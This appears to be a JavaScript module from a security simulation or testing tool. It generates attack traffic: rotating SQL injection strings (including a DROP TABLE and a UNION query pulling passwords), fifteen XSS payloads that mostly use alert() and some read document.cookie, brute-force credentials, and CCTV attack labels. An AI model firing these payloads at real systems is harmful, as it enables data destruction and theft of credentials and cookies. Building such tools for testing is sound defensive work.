// Attack payload generators
export function getAttackPayload(type) {
  const payloads = {
    sql: { query: "SELECT * FROM users WHERE 1=1 OR password LIKE '%'" },
    xss: { query: '<script>alert(document.cookie)</script>' },
    brute: { username: `admin_${Math.floor(Math.random() * 1000)}`, password: 'password123' },
    ddos: { rate: 10000 },
    healthcare: { sensor_data: [1024, 5000, 100, 100] },
    agriculture: { sensor_data: [100, 0, 0, 255, 255, 255] },
    urban: { sensor_data: [500, 5] },
    cctv: { attack_type: 'feed_tampering' },
  }
  return payloads[type] || {}
}

// SQL injection payloads rotation
export function getSqlPayload(index) {
  const payloads = [
    `SELECT * FROM users WHERE id=${1000 + index} OR 1=1 --`,
    `admin' --`,
    `UNION SELECT 1, 'admin', password FROM users --`,
    `1'; DROP TABLE users --`,
    `' OR '1'='1`,
  ]
  return payloads[index % payloads.length]
}

// XSS payloads rotation
export function getXssPayload(index) {
  const payloads = [
    `<script>alert('XSS')</script>`,
    `<img src=x onerror=alert(document.cookie)>`,
    `<svg onload=alert('XSS')>`,
    `<body onload=alert('XSS')>`,
    `<input onfocus=alert(1) autofocus>`,
    `<a onmouseover=alert(document.domain)>hover me</a>`,
    `<iframe src="javascript:alert('XSS')">`,
    `<div style="background:url(javascript:alert('XSS'))">`,
    `<marquee onstart=alert('XSS')>`,
    `<details open ontoggle=alert('XSS')>`,
    `<embed src="javascript:alert(1)">`,
    `<object data="javascript:alert('XSS')">`,
    `<tt onmouseover="alert(1)">test</tt>`,
    `<caption onpointerdown=alert(1)>XSS</caption>`,
    `<col draggable="true" ondragenter="alert(1)">test</col>`,
  ]
  return payloads[index % payloads.length]
}

// CCTV attack types rotation
export function getCctvAttackType(index) {
  const types = ['feed_tampering', 'camera_disable', 'unauthorized_access']
  return types[index % types.length]
}
